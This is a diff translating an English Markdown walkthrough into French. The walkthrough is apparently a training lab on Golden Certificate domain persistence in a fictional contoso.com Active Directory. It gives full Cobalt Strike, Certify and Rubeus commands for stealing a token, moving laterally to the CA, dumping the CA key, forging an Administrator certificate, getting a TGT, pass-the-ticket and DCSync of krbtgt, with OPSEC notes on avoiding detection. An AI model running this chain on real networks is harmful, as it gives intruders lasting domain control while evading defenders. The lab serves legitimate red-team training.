@@ -1,91 +1,91 @@
-# Domain Persistence Golden Certificates
+# Lab — Domain Persistence avec Golden Certificates
 
->The objective of this lab is to leverage DPERSIST1 for domain admin **persistence**.
->Once you have SYSTEM access beacon on the Certificate Service server.
+> L’objectif est d’utiliser **DPERSIST1** pour une Persistence de niveau Domain Admin.
+> Le scénario débute après l’obtention d’un Beacon SYSTEM sur le serveur Certificate Services.
 
 ===
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Use the high-integrity Beacon to impersonate a domain admin.  
+1. Lancer Cobalt Strike et se connecter au team server.
+2. Utiliser le Beacon high integrity pour effectuer une impersonation de Domain Admin.  
 
-On the existing beacon, open the process browser and find a process owned by dyork a domain admin on lon-wkstn-1
+Depuis le Beacon existant, ouvrir Process Browser et rechercher un processus appartenant à `dyork`, Domain Admin sur `lon-wkstn-1`.
 
 `process_browser`
-Steal the token of that process:
+Récupérer le token de ce processus :
 
 `steal_token <pid>`
-OPSEC-🟢SAFE — token impersonation in beacon thread, no process spawn.
+OPSEC-🟢SAFE — Token Impersonation dans le thread Beacon, sans création de processus.
 
 
-3. Move laterally to *lon-cs-1*.
+3. Effectuer un Lateral Movement vers `lon-cs-1`.
 
-Load the SCShell Aggressor script.
+Charger le script Aggressor de SCShell.
 
-Go to Cobalt Strike > Script Manager.  
-Click Load.  
-Select `C:\Tools\SCShell\CS-BOF\scshell.cna`.  
-SCShell uses the service binary payload, so make sure to set the spawnto first.  
+Ouvrir **Cobalt Strike > Script Manager**.  
+Cliquer sur **Load**.  
+Sélectionner `C:\Tools\SCShell\CS-BOF\scshell.cna`.  
+SCShell utilise un payload de service : vérifier d’abord la configuration de `spawnto`.  
 
 `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`  
 
-Move laterally to lon-cs-1  
+Effectuer le Lateral Movement vers `lon-cs-1`  
   
 `jump scshell64 lon-cs-1 smb`  
 
-> **OPSEC-🟠CAUTION** — SCShell abuses `ChangeServiceConfigA` to temporarily overwrite an existing service's binary path, execute the payload, then restore it.  
-> No new service created (**no Event 7045**), but generates **Event 7040** (service config changed) and a brief anomalous service execution.  
-> SMB named pipe to SCM generates **Event 4624 Type 3** on target.  
+> **OPSEC-🟠CAUTION** — SCShell utilise `ChangeServiceConfigA` pour modifier temporairement le chemin du binaire d’un service existant, exécuter le payload, puis restaurer la configuration.  
+> Aucun nouveau service n’est créé (**pas d’Event 7045**), mais un **Event 7040** (changement de configuration du service) et une exécution inhabituelle peuvent apparaître.  
+> Le named pipe SMB vers SCM peut générer l’**Event 4624 type 3** sur la cible.  
 
-> **Stealthier alternative:** `jump winrm64 lon-cs-1 smb` if WinRM is enabled on the CA server — no service modification, generates only Event 4624 Type 3.  
-> Check first with `powerpick Test-WSMan lon-cs-1`.  
+> **Alternative mentionnée dans les notes :** `jump winrm64 lon-cs-1 smb` si WinRM est actif sur la CA, sans modification de service, avec Event 4624 type 3.  
+> Vérifier au préalable avec `powerpick Test-WSMan lon-cs-1`.  
 
-⚠️ A new SYSTEM Beacon should appear
+⚠️ Un nouveau Beacon SYSTEM doit apparaître.
 
 
-4. Dump the CA's certificate.
+4. Récupérer le certificat de la CA.
 
     ```Beacon-nocolor
     execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
     ```
 
-    > **OPSEC-🟠CAUTION** — `execute-assembly` spawns a sacrificial process.  
-    > Certify accesses the CA private key via `ICertAdmin` COM interface under SYSTEM.  
-    > Does not generate a CA audit event by default, but verbose CA logging may record it.  
-    > May generate **Event 5061** (cryptographic operation) if CNG key auditing is active.  
-    > Ensure `spawnto` is set to a low-profile binary (`dllhost.exe`) before this step.  
+    > **OPSEC-🟠CAUTION** — `execute-assembly` crée un processus temporaire.  
+    > Certify accède à la clé privée de la CA via l’interface COM `ICertAdmin` sous SYSTEM.  
+    > Un audit détaillé de la CA peut enregistrer cette opération, même si les notes indiquent qu’aucun événement n’est généré par défaut.  
+    > L’**Event 5061** (opération cryptographique) peut être généré lorsque l’audit CNG est activé.  
+    > Vérifier la configuration de `spawnto` avant cette étape (exemple du lab : `dllhost.exe`).  
 
-5. Save the certificate to your attacker desktop.  
+5. Enregistrer le certificat sur l’Attacker Desktop.  
 
     ```PowerShell
     [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
     ```
 
-    > **OPSEC-🟢SAFE** — Runs on the attacker desktop, not the target. No beacon action, no target disk write, no network event.
+    > **OPSEC-🟢SAFE** — Exécution sur l’Attacker Desktop, sans action Beacon ni écriture sur le disque cible.
 
-5. Use the certificate to force a user certificate for the default domain administrator account.  
+5. Utiliser le certificat pour en générer un au nom du compte Administrator du domaine.  
 
     ```Terminal-nocolor
     C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
     ```
 
-⚠️ Since this is forged, you can do this directly on the Attacker machine, rather than in Beacon.
+⚠️ La création de ce certificat forgé peut être effectuée sur l’Attacker Desktop plutôt que dans le Beacon.
 
-> **OPSEC-🟢SAFE** — Runs entirely on the attacker desktop. No network traffic, no beacon action, nothing touches the target or the CA.  
-> The forged cert is never submitted to the CA so **Events 4886/4887 are not generated**.  
-> The only detectable moment is when the cert is used for PKINIT in step 6.  
+> **OPSEC-🟢SAFE** — L’opération se déroule sur l’Attacker Desktop, sans trafic réseau ni interaction avec la CA dans le scénario décrit.  
+> Le certificat forgé n’est pas soumis à la CA : les **Events 4886/4887** liés à une demande ne sont donc pas générés par cette étape.  
+> L’utilisation du certificat avec **PKINIT** à l’étape 6 constitue un point de détection important.  
 >
-> **Note:** The `--crl` flag embeds the CRL distribution point — the DC must reach that LDAP path to validate the cert during PKINIT.  
-> If CRL checking fails, the AS-REQ will be rejected.
+> **Note :** l’option `--crl` intègre le CRL Distribution Point ; le DC doit pouvoir joindre le chemin LDAP pour valider le certificat via PKINIT.  
+> Si la vérification CRL échoue, la requête AS-REQ est rejetée.
 
-6. Use the forged certificate to request a TGT for Administrator.
+6. Utiliser le certificat forgé pour demander un TGT au nom d’Administrator.
 
     ```Beacon-nocolor
     execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:[FORGED CERT] /enctype:aes256 /nowrap
     ```
 
-    > **OPSEC-🟠CAUTION** — `execute-assembly` spawns a sacrificial process. PKINIT AS-REQ generates **Event 4768** on the DC. A forged cert (not in the CA's issued cert database) used with PKINIT may trigger MDI's *Suspicious certificate usage over Kerberos protocol* detection. Using `/enctype:aes256` (not RC4) reduces additional signature risk. The forged cert base64 string is passed inline — nothing written to beacon host disk.
+    > **OPSEC-🟠CAUTION** — `execute-assembly` crée un processus temporaire. Une requête PKINIT AS-REQ génère l’**Event 4768** sur le DC. L’utilisation d’un certificat non émis par la CA peut déclencher une détection MDI. Le certificat Base64 est transmis inline, sans écriture sur le disque du Beacon.
     
->Output:  
+> Sortie :  
 
 ```
 [04/14 11:33:32] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO /certificate:MIACAQMwgAYJKoZIhvcNAQcBoI<SNIP>AAAAAAAAAAAAAAAAA /enctype:aes256 /nowrap
@@ -131,77 +131,77 @@ Move laterally to lon-cs-1
 [04/14 11:34:03] [+] job 1 completed
 ```  
 
-⚠️ In this lab, you have learned how to dump a CA's certificate and use it for elevated domain persistence.
+⚠️ Ce lab présente la récupération d’un certificat de CA et son utilisation dans une technique de Persistence élevée sur le domaine.
 
 ===
 
-## Proving Domain Admin Access with the Forged TGT
+## Vérifier l’accès Domain Admin avec le TGT forgé
 
-### Step 1 — Inject TGT into beacon session
+### Étape 1 — Injecter le TGT dans la session Beacon
 
 ```Beacon-nocolor
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
 ```
 
-> **OPSEC-🟢SAFE** — Injects the ticket into the beacon's current logon session in-memory. No disk write. No network traffic at injection time.
+> **OPSEC-🟢SAFE** — Injection du ticket en mémoire dans la session de logon du Beacon, sans écriture disque ni trafic réseau au moment de l’injection.
 >
-> **Stealthier alternative:** Append `/ptt` to the `asktgt` command in step 6 to inject immediately and skip this separate call entirely — one fewer `execute-assembly` invocation.
+> **Alternative indiquée :** ajouter `/ptt` à `asktgt` à l’étape 6 pour injecter directement le ticket et éviter un appel distinct à `execute-assembly`.
 
-### Step 2 — Verify ticket loaded
+### Étape 2 — Vérifier le chargement du ticket
 
 ```Beacon-nocolor
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 ```
 
-> **OPSEC-🟢SAFE** — Local only, no network traffic. Confirm `Administrator @ CONTOSO.COM` is present and check expiry before using.
+> **OPSEC-🟢SAFE** — Contrôle local sans trafic réseau : vérifier la présence de `Administrator @ CONTOSO.COM` et la date d’expiration du ticket.
 
-### Step 3 — List DC C$ (conclusive DA proof)
+### Étape 3 — Lister le partage C$ du DC
 
 ```Beacon-nocolor
 ls \\lon-dc-1.contoso.com\C$
 ```
 
-> **OPSEC-🟢SAFE** — `ls` uses the injected Kerberos ticket over SMB. Generates **Event 4624 Type 3** on the DC — identical to legitimate admin activity. No remote process spawn, no service creation. Access to `C$` on a DC requires DA or equivalent.
+> **OPSEC-🟢SAFE** — `ls` utilise le ticket Kerberos injecté via SMB et peut générer l’**Event 4624 type 3** sur le DC. Aucun service ni processus distant n’est créé. L’accès à `C$` nécessite des privilèges administratifs sur le DC.
 
-### Step 4 — Read flag from DC
+### Étape 4 — Lire le flag sur le DC
 
 ```Beacon-nocolor
 download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
 ```
 
-> **OPSEC-🟢SAFE** — File pull over the existing beacon C2 channel. Generates **Event 4663** on DC only if Object Access auditing is enabled (not default).
+> **OPSEC-🟢SAFE** — Lecture via le canal C2 du Beacon. L’**Event 4663** peut apparaître sur le DC si l’audit Object Access est activé.
 
-### Step 5 — DCSync for krbtgt (only if Golden Ticket is the next objective)
+### Étape 5 — DCSync de krbtgt (si l’objectif suivant est Golden Ticket)
 
 ```Beacon-nocolor
 dcsync CONTOSO.COM\krbtgt
 ```
 
-> **OPSEC-🟠CAUTION** — Generates **Event 4662** (DS replication access) on the DC. MDI specifically detects replication requests from non-DC sources. Do not use DCSync purely to prove DA — `ls \\dc\C$` is sufficient and far stealthier.
+> **OPSEC-🟠CAUTION** — L’opération génère potentiellement l’**Event 4662** (réplication DS) sur le DC et peut être détectée par MDI. Le lab indique qu’un accès au partage `C$` suffit à vérifier les privilèges.
 
 ---
 
-### DPERSIST1 Full Chain OPSEC Summary
+### Récapitulatif OPSEC de la chaîne DPERSIST1
 
-| Stage | Action | OPSEC | Key Events |
+| Étape | Action | OPSEC | Events principaux |
 |-------|--------|-------|------------|
-| Token theft | `steal_token <pid>` | OPSEC-🟢SAFE | None — in-beacon thread |
-| Lateral to CA | `jump scshell64` | OPSEC-🟠CAUTION | Event 7040 (svc config change), 4624 Type 3 |
-| Lateral (alt) | `jump winrm64` | OPSEC-🟢SAFE | Event 4624 Type 3 only |
-| Dump CA cert | `Certify manage-self --dump-certs` | OPSEC-🟠CAUTION | Event 5061 if CNG auditing active |
-| Forge cert | `Certify forge` (attacker desktop) | OPSEC-🟢SAFE | No network, no target touch, no CA events |
-| PKINIT TGT | `Rubeus asktgt /certificate:` | OPSEC-🟠CAUTION | Event 4768 — MDI alert for non-issued cert |
-| Inject ticket | `Rubeus ptt` | OPSEC-🟢SAFE | None |
-| Prove DA | `ls \\dc\C$` | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
-| Read flag | `download \\dc\C$\...\root.txt` | OPSEC-🟢SAFE | Event 4663 on DC (if audited) |
-| Cred harvest | `dcsync CONTOSO\krbtgt` | OPSEC-🟠CAUTION | Event 4662 on DC — MDI alert |
+| Récupération de token | `steal_token <pid>` | OPSEC-🟢SAFE | None — in-beacon thread |
+| Lateral Movement vers CA | `jump scshell64` | OPSEC-🟠CAUTION | Event 7040 (svc config change), 4624 Type 3 |
+| Lateral Movement alternatif | `jump winrm64` | OPSEC-🟢SAFE | Event 4624 Type 3 only |
+| Récupération du certificat CA | `Certify manage-self --dump-certs` | OPSEC-🟠CAUTION | Event 5061 if CNG auditing active |
+| Création du certificat forgé | `Certify forge` (attacker desktop) | OPSEC-🟢SAFE | No network, no target touch, no CA events |
+| TGT via PKINIT | `Rubeus asktgt /certificate:` | OPSEC-🟠CAUTION | Event 4768 — MDI alert for non-issued cert |
+| Injection de ticket | `Rubeus ptt` | OPSEC-🟢SAFE | None |
+| Vérification Domain Admin | `ls \\dc\C$` | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
+| Lecture du flag | `download \\dc\C$\...\root.txt` | OPSEC-🟢SAFE | Event 4663 on DC (if audited) |
+| Récupération de credentials | `dcsync CONTOSO\krbtgt` | OPSEC-🟠CAUTION | Event 4662 on DC — MDI alert |
 
-### Why Golden Certificates beat Golden Tickets for persistence
+### Pourquoi les Golden Certificates peuvent dépasser les Golden Tickets pour la Persistence
 
-| Property | Golden Ticket | Golden Certificate (DPERSIST1) |
+| Propriété | Golden Ticket | Golden Certificate (DPERSIST1) |
 |----------|--------------|-------------------------------|
-| Survives DA password reset | No | **Yes** |
-| Survives krbtgt rotation | No | **Yes** |
-| Requires CA private key | No | Yes — one-time dump needed |
-| MDI detection vector | Ticket anomaly | PKINIT with non-CA-issued cert |
-| Persistence duration | Ticket lifetime (max 10y) | CA cert lifetime (typically 5–10 years) |
+| Résiste au changement du mot de passe DA | Non | **Oui** |
+| Résiste à la rotation krbtgt | Non | **Oui** |
+| Nécessite la clé privée CA | Non | Oui — récupération initiale |
+| Détection MDI | Anomalie du ticket | PKINIT avec certificat non émis par la CA |
+| Durée de Persistence | Durée du ticket (jusqu’à 10 ans selon les notes) | Durée du certificat CA (souvent 5–10 ans selon les notes) |
